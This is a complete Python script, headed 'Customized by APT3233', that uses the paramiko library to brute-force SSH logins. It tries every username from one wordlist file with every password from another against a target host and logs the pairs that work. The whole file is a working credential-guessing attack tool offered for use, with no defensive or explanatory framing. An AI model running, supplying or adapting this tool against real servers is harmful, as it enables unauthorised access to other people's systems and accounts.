
#-----------------Customized by APT3233-------------------
# Don't change anything 

import argparse
import logging
import paramiko

def read_file(filename):
    
    with open(filename, "r") as f:
        lines = f.readlines()
    return [line.strip() for line in lines]

def try_ssh_login(hostname, username, password):

    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh_client.connect(hostname, username=username, password=password)
        return True
    except paramiko.AuthenticationException:
        return False
    except paramiko.SSHException:
        return False
    finally:
        ssh_client.close()

def main():
   

    logging.basicConfig(level=logging.INFO)

    parser = argparse.ArgumentParser(description="SSH login tool")
    parser.add_argument("hostname", help="The hostname of the SSH server")
    parser.add_argument("-u", "--username-file", help="The username file")
    parser.add_argument("-p", "--password-file", help="The password file")

    args = parser.parse_args()

    usernames = read_file(args.username_file)
    passwords = read_file(args.password_file)

    valid_credentials = []

    for username in usernames:
        for password in passwords:
            if try_ssh_login(args.hostname, username, password):
                valid_credentials.append((username, password))

    if valid_credentials:
        logging.info("Valid credentials:")
        for username, password in valid_credentials:
            logging.info(f"{username}:{password}")
    else:
        logging.info("No valid credentials found.")

if __name__ == "__main__":
    main()
